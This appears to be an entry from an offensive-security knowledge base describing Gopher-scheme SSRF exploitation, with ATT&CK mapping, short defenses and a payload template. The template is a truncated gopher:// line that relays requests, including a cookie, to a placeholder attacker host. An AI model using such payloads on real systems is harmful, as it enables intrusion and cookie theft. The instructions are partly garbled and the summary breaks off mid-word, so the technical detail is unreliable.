---
id: 70b18837-9dc2-460b-ab4a-69674e56d9ae
name: Gopher Proxy SSRF Exploitation
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:37.925107+00:00'
updated_at: '2023-04-10T20:23:58.717355+00:00'
tactics:
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Exploitation of Remote Services|T1210 - Exploitation of Remote Services]]'
tags:
- '[[Gopher]]'
- '[[Gopher HTTP]]'
- '[[Server-Side Request Forgery]]'
- '[[SSRF exploitation via URL Scheme]]'
---

# Gopher Proxy SSRF Exploitation

## Summary

Gopher is a protocol used for retrieving documents over the Internet. It is similar to HTTP, but has its own set of commands and is not as widely used. An attacker can exploit SSRF vulnerabilities in web applications that use the Gopher URL scheme to request Gopher resources. By crafting a maliciou

## Description

# Description

Gopher is a protocol used for retrieving documents over the Internet. It is similar to HTTP, but has its own set of commands and is not as widely used. An attacker can exploit SSRF vulnerabilities in web applications that use the Gopher URL scheme to request Gopher resources. By crafting a malicious Gopher request, an attacker can force the server to make requests to internal resources that should not be accessible from the outside. This can lead to sensitive data disclosure, remote code execution, and other security issues.

Technical Explanation: An attacker can use the Gopher protocol to make requests to internal resources that should not be accessible from the outside. By crafting a malicious Gopher request, an attacker can force the server to make requests to internal resources and return the response to the attacker. This can lead to sensitive data disclosure, remote code execution, and other security issues.

Business Value: An attacker can use this technique to gain access to sensitive data, execute code on the server, and potentially take control of the entire system. This can lead to loss of data, financial loss, and reputational damage for the organization.

 

## Requirements

1. Access to a web application that uses the Gopher URL scheme

1. Knowledge of SSRF vulnerabilities

1. Ability to craft a malicious Gopher request

 

## Defense

1. Implement input validation to prevent SSRF vulnerabilities

1. Use a whitelist approach to limit the URLs that can be accessed

1. Monitor network traffic for suspicious Gopher requests

 

## Objectives

1. Exploit SSRF vulnerabilities in web applications that use the Gopher URL scheme

1. Force the server to make requests to internal resources that should not be accessible from the outside

1. Gain access to sensitive data, execute code on the server, and potentially take control of the entire system

 

# Instructions

1. This command allows the attacker to use a gopher proxy to send GET and POST requests to a specified target. The command takes the following arguments:
1. <proxyserver>: The IP address or hostname of the proxy server to be used.
2. <attacker>: The IP address or hostname of the attacker's machine.
3. /x: The path on the attacker's machine where the output of the command will be saved.
4. Cookie: The cookie value to be sent with the POST request.

To use the command, simply replace the <proxyserver> and <attacker> values with the appropriate IP addresses or hostnames, and the command will send a GET request to http://<attacker:80>/x and a POST request to http://<attacker>:80/x with the specified cookie value.

 



**Code**: [[gopher://<proxyserver>:8080/_GET http://<attacker:]]



> The gopher protocol is a simple and lightweight protocol used for querying documents and resources on the internet. It works by sending requests to a gopher proxy server, which then forwards the request to the target server. This command takes advantage of the gopher protocol to send GET and POST requests to a specified target through a proxy server. The GET request is used to retrieve data from the target, while the POST request is used to send data to the target. The command also allows the attacker to specify a cookie value to be sent with the POST request.

## MITRE ATT&CK Mapping

### Tactics

- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Exploitation of Remote Services|T1210 - Exploitation of Remote Services]]

## Tags

- [[Gopher]]
- [[Gopher HTTP]]
- [[Server-Side Request Forgery]]
- [[SSRF exploitation via URL Scheme]]


